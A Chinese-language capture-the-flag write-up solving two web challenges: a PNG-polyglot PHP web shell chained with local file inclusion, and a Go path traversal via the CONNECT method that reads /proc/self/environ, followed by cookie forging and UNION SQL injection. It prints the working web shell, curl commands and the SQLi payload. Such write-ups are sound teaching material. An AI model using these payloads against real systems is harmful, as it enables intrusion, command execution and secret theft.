# Imgura

首先可以發現到 server 的 `.git` 可以有東西，所以可以用一些工具如 [DotGit](https://chrome.google.com/webstore/detail/dotgit/pampamgoihgcedonnphgehgondkhikel) 把整個 repo 下載下來，之後用 `git log` 看一下裡面的 history 之後 checkout 到有檔案的任意 commit，例如 `c7fdc1d4948f920604f2bb069dbddf0d3e03d923`。

從 source code 裡面可以看出在 `/dev_test_page` 的地方有頁面，實際測試 [https://imgura.chal.h4ck3r.quest/dev_test_page/](https://imgura.chal.h4ck3r.quest/dev_test_page/) 也能看到預期中的頁面。

閱讀裡面的程式碼可以發現 `index.php` 有個的 LFI 漏洞，但是他會強制在 include 的 path 後面加上 `.php`:

```php
include ($_GET['page'] ?? 'pages/main') . ".php";
```

另外在 `upload.php` 可以看到它有提供檔案上傳，但是會做以下的幾個檢測:

* 檢查副檔名: `name.split('.')[1] in ['png', 'jpeg', 'jpg']` (以 Python 表示的話)
* 檔案大小需小於 256000 bytes
* fileinfo 檢測檔案為 `image/png` 或是 `image/jpeg
* `getimagesize` 取得的長寬都不得超過 512
* 檔案內容中不得出現 `<?php` (不分大小寫)

通過檢測之後就會隨機產生個檔名，然後移動到 `images` 資料夾中，而該檔名為 `${prefix}_${filename}` 格式，其中 `filename` 為使用者可控。

副檔名的部份可以簡單的以 `shell.png.php` 的方法繞過。而圖片本身的內容我是先創建一個空白的 png，長寬小於 512，之後改名為 `shell.png.php` 之後直接在後面 append `<?= system($_GET['cmd']); ?>` 即可，因為 png 這個格式允許你在 IEND 的後面亂塞東西，而 `<?=` 也是 php 的另一個 open tag，所以可以通過檢測。

之後使用下方指令上傳可以在 `Location` 的地方看到新的檔案路徑:

```zsh
curl 'https://imgura.chal.h4ck3r.quest/dev_test_page/upload.php' -F 'image_file=@shell.png.php' -v
```

例如我得到的其中一個是 `images/10f428f2_shell.png.php`，那麼就利用下方的網址用 LFI 去把 webshell include 進去就能得到 flag 了:

```text
https://imgura.chal.h4ck3r.quest/dev_test_page/?page=images/10f428f2_shell.png&cmd=cat%20/this_is_flaggggg
```

> 直接存取 `images/10f428f2_shell.png.php` 應該也是可以...

FLAG: `FLAG{ImgurAAAAAA}`

# DVD Screensaver

從 source code 可以看出 `/login` 疑似有 SQLi，但實質上因為 `IsLetter` 的檢查讓他沒辦法做 injection，實際上只能透過 `/` 裡面從 session 中取得的 username 才能 SQLi。

要 SQLi 需要能為任意的 username 取得對應的 signed cookie，也就是需要拿到 `SECRET_KEY` 才行。

裡面的 `/static/` 明顯能看出有 Path Traversal 的洞，但是實際上去執行的時候卻會失敗:

```zsh
> curl --path-as-is 'http://dvd.chal.h4ck3r.quest:10001/static/../app.go'
<a href="/app.go">Moved Permanently</a>.
```

這是因為 golang 預設的 http server 就會去 normalize 你的 path，像是把 `..` 等等的東西給簡化，但是我們要 Path Traversal 必須要讓 `strings.TrimPrefix(r.URL.Path, "/static/")` 出現 `..` 才行。

去讀 golang 的 http source code 可以在[這邊](https://cs.opensource.google/go/go/+/refs/tags/go1.17.2:src/net/http/server.go;l=2363;drc=refs%2Ftags%2Fgo1.17.2;bpv=0;bpt=1)看到當 http verb 是 `CONNECT` 的時候它不會去 normalize，所以用下方的指令就能拿到 `SECRET_KEY` 了:

```zsh
curl -X CONNECT --path-as-is 'http://dvd.chal.h4ck3r.quest:10001/static/../../proc/self/environ' --output -
```

例如我找到的是 `d2908c1de1cd896d90f09df7df67e1d4`，之後只要利用這個去 sign cookie 就能 SQLi 了。

翻一下 `github.com/gorilla/sessions` 底層所用的 cookie signing 的 module 是 `github.com/gorilla/securecookie`，所以可以利用它寫出個 go 程式去幫你 sign cookie 出來，這部分的程式碼在 `sign.go` 之中。

之後在 python 可以利用 `subprocess.check_output` 去簡單的呼叫那個 sign cookie 的程式，之後利用下方的 union select SQLi 就能拿到 flag 了:

```sql
' union select flag, 'pekomiko' from users where flag like 'FLAG{%' and ''='
```

這部分詳見 `solve.py`。

FLAG: `FLAG{WOW_I_am_the_real_flag____MEOWWWW}`
